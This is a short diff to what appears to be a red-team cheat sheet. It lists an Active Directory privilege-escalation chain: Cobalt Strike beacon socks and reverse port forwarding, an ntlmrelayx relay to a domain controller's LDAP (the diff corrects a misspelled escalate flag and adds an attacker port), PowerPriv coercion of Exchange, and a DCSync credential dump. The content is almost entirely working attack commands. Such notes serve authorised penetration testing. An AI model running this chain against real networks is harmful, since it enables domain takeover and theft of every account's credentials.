@@ -73,7 +73,7 @@ PrivEsc
     Compromised Beacon: socks 36529
     Compromised Beacon: rportfwd 80 127.0.0.1 80
     Kali: Verify /etc/proxychains.conf port matches socks above
-    Kali: proxychains ntlmrelayx -t ldap://DC_IP --esculate-user username
+    Kali: proxychains ntlmrelayx -t ldap://DC_IP --escalate-user username (-attackerPort 8080)
     Compromised Beacon: powershell PowerPriv -targetHost Exchange_IP -attackerHost Beacon_IP (may be internal IP)
     dcsync fqdn dom\user
    
